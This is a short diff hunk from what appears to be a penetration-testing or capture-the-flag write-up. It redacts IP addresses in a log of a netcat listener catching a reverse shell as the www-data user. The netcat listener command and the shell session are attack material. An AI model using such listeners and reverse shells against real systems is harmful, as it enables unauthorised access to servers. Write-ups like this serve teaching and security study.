@@ -26,7 +26,7 @@
 ```bash
 └─$ rlwrap nc -nvlp 4242
 listening on [any] 4242 ...
-connect to [192.168.251.186] from (UNKNOWN) [172.18.0.4] 59348
+connect to [xxx.xxx.xxx.186] from (UNKNOWN) [xxx.xx.0.4] 59348
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
